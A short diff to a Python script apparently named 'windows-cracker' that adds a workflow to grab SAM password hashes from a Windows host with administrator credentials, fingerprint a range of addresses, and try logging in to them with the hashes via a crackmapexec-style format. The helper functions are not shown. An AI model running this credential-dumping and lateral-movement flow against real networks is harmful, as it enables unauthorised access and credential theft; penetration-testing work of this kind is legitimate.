@@ -95,6 +95,7 @@ def main():
     parser.add_argument('ip_address', help='ip address of the windows target host')
     parser.add_argument('username', help='username of windows administrator')
     parser.add_argument('password', help='password of windows administrator')
+    parser.add_argument('ip_range', help='range of the boxes to attempt to log in to')
     args = parser.parse_args()
 
     executables = [
@@ -110,6 +111,12 @@ def main():
         print('Missing programs required to run windows-cracker: {}'.format(joined))
         print('Ensure listed programs are in your path before running')
         return 1
+
+    sam_hashes = samGrab(args.ip_address, args.username, args.password)
+    ip_addrs = osFingerprint(args.ip_range)
+    formatted_sam_hashes = formatCrackmapSam(sam_hashes)
+    result_dict = attemptLogon(formatted_sam_hashes, ip_addrs)
+    print(result_dict)
 
     return 0
 
